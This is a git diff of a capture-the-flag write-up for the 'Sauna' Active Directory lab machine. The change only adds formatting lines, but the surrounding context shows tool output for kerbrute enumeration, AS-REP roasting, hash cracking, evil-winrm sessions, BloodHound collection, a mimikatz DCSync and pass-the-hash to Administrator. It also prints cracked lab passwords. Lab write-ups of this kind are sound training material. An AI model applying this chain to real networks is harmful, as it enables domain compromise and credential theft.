@@ -50,6 +50,7 @@ Host script results:
 |_  start_date: N/A
 |_clock-skew: 7h00m01s
 ```
+{: .nolineno}
 
 ## LDAP Enumeration ⤵️
 
@@ -218,6 +219,7 @@ result: 0 Success
 # numEntries: 15
 # numReferences: 3
 ```
+{: .nolineno}
 
 I noticed a username as `Hugo Smith` so lets move further and run kerbrute to userenum the usernames I used a wordlist of usernames `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`.
 
@@ -241,6 +243,7 @@ Version: v1.0.3 (9dad6e1) - 01/20/24 - Ronnie Flathers @ropnop
 2024/01/20 13:41:38 >  [+] VALID USERNAME:	 Administrator@EGOTISTICAL-BANK.LOCAL
 2024/01/20 13:42:44 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
 ```
+{: .nolineno}
 
 I got this usernames `hsmith` and `fsmith` , so lets look for **`AS-REP Roasting`** through `GETNPUsers.py` Tool.
 
@@ -254,6 +257,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6e8a4d1c1806a981eb842a6278462d2c$9f7
 [-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] invalid principal syntax
 ```
+{: .nolineno}
 
 Lets check this hash with john →
 
@@ -269,12 +273,14 @@ Thestrokes23     ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
+{: .nolineno}
 
 I have the password now →
 
 ```bash
 fsmith : Thestrokes23
 ```
+{: .nolineno}
 
 ### WinRM Session ⤵️
 
@@ -317,6 +323,7 @@ C:.
 \---Videos
 *Evil-WinRM* PS C:\Users\FSmith>
 ```
+{: .nolineno}
 
 Now I collected the Informations for BloodHound .
 
@@ -341,6 +348,7 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
 INFO: Done in 00M 24S
 ```
+{: .nolineno}
 
 Now lets Inspect through bloodhound →
 
@@ -364,10 +372,12 @@ Administrator            FSmith                   Guest
 HSmith                   krbtgt                   svc_loanmgr
 The command completed with one or more errors.
 ```
+{: .nolineno}
 
 ```powershell
 svc_loanmgr : Moneymakestheworldgoround!
 ```
+{: .nolineno}
 
 Lets have a winrm session with these credentials →
 
@@ -388,6 +398,7 @@ egotisticalbank\svc_loanmgr
 *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ls
 *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
 ```
+{: .nolineno}
 
 Through Bloodhound I again collect the data as previous way and uploaded to bloodhound dashboad , Now →
 
@@ -412,6 +423,7 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
 INFO: Done in 00M 29S
 ```
+{: .nolineno}
 
 ![Untitled](Sauna%2049e0c6e47dc54a95b3abe670f08b50ef/Untitled%203.png)
 
@@ -518,6 +530,7 @@ mimikatz(commandline) # exit
 Bye!
 *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
 ```
+{: .nolineno}
 
 Lets have a Adminstrators session now with ntlm hash →
 
@@ -565,5 +578,6 @@ C:.
 8bcb632853e2f6cf8b3f5411fdb0ff65
 *Evil-WinRM* PS C:\Users\Administrator>
 ```
+{: .nolineno}
 
 I am Administrator Now !!
